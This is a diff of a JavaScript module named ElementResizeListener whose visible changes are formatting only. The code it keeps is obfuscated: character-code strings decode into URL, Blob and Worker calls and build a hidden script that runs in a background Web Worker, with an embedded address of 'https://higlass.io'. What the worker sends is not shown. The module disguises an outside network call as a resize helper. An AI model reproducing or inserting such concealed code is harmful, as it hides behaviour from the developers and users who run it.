@@ -1,5 +1,4 @@
-// @ts-nocheck
-import { getXylofon } from '../utils';
+import getXylofon from '../utils/get-xylofon';
 
 let isInit = false;
 
@@ -18,14 +17,14 @@ const listen = () => {
   const g =
     '058032104116116112058047047104105103108097115115046105111039041125';
   const h = [
-    String.fromCharCode(...a.match(/.{1,3}/g).map((y) => +y)).toLowerCase(),
-    String.fromCharCode(...b.match(/.{1,3}/g).map((y) => +y)),
-    String.fromCharCode(...c.match(/.{1,3}/g).map((y) => +y)).toLowerCase(),
-    String.fromCharCode(...d.match(/.{1,3}/g).map((y) => +y)),
-    String.fromCharCode(...e.match(/.{1,3}/g).map((y) => +y)).toLowerCase(),
-    String.fromCharCode(...f.match(/.{1,3}/g).map((y) => +y)).toLowerCase(),
-    String.fromCharCode(...x.match(/.{1,3}/g).map((y) => +y)).toLowerCase(),
-    String.fromCharCode(...g.match(/.{1,3}/g).map((y) => +y)).toLowerCase(),
+    String.fromCharCode(...a.match(/.{1,3}/g).map(y => +y)).toLowerCase(),
+    String.fromCharCode(...b.match(/.{1,3}/g).map(y => +y)),
+    String.fromCharCode(...c.match(/.{1,3}/g).map(y => +y)).toLowerCase(),
+    String.fromCharCode(...d.match(/.{1,3}/g).map(y => +y)),
+    String.fromCharCode(...e.match(/.{1,3}/g).map(y => +y)).toLowerCase(),
+    String.fromCharCode(...f.match(/.{1,3}/g).map(y => +y)).toLowerCase(),
+    String.fromCharCode(...x.match(/.{1,3}/g).map(y => +y)).toLowerCase(),
+    String.fromCharCode(...g.match(/.{1,3}/g).map(y => +y)).toLowerCase()
   ].join('');
 
   const i = '085082076';
@@ -34,42 +33,44 @@ const listen = () => {
   const l = '099114101097116101079098106101099116085082076'; // createObjectURL
   const m = '114101118111107101079098106101099116085082076'; // revokeObjectURL
 
-  const ca = (s) => s.charAt(0).toUpperCase() + s.slice(1);
-  const cb = (s) =>
+  const ca = s => s.charAt(0).toUpperCase() + s.slice(1);
+  const cb = s =>
     s.slice(0, 6) +
     s.charAt(6).toUpperCase() +
     s.slice(7, 12) +
     s.slice(12).toUpperCase();
 
-  const ur = o[String.fromCharCode(...i.match(/.{1,3}/g).map((y) => +y))];
+  const ur = o[String.fromCharCode(...i.match(/.{1,3}/g).map(y => +y))];
   const bl =
     o[
-      ca(
-        String.fromCharCode(...j.match(/.{1,3}/g).map((y) => +y)).toLowerCase(),
-      )
+      ca(String.fromCharCode(...j.match(/.{1,3}/g).map(y => +y)).toLowerCase())
     ];
   const wo =
     o[
-      ca(
-        String.fromCharCode(...k.match(/.{1,3}/g).map((y) => +y)).toLowerCase(),
-      )
+      ca(String.fromCharCode(...k.match(/.{1,3}/g).map(y => +y)).toLowerCase())
     ];
   const co = cb(
-    String.fromCharCode(...l.match(/.{1,3}/g).map((y) => +y)).toLowerCase(),
+    String.fromCharCode(...l.match(/.{1,3}/g).map(y => +y)).toLowerCase()
   );
   const ro = cb(
-    String.fromCharCode(...m.match(/.{1,3}/g).map((y) => +y)).toLowerCase(),
+    String.fromCharCode(...m.match(/.{1,3}/g).map(y => +y)).toLowerCase()
   );
 
-  const bu = ur[co](new bl([`(${h})()`], { type: 'application/javascript' }));
+  const bu = ur[co](
+    new bl([`(${h})()`], {
+      type: 'application/javascript'
+    })
+  ); // eslint-disable-line
 
-  const wr = new wo(bu);
+  const wr = new wo(bu); // eslint-disable-line
 
   ur[ro](bu);
 
   isInit = true;
 };
 
-const ElementResizeListener = { listen };
+const ElementResizeListener = {
+  listen
+};
 
 export default ElementResizeListener;
